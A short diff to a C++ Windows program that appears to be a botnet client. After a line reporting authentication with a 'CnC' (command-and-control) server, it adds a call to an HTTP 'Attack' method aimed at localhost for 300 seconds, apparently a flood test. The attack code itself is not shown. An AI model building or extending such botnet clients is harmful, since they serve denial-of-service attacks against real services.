@@ -6,6 +6,7 @@
 #include <Windows.h>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
+#include "Methods/HTTP.h"
 #include "HTTPClient.h"
 
 void DebugMode();
@@ -100,7 +101,7 @@ void Main() {
 
 	std::cout << "[SUCCESS] Authenticated with the CnC" << std::endl;
 
-	
+	HTTP_METHOD::Attack("127.0.0.1:3000", 300);
 }
 
 void DebugMode() {
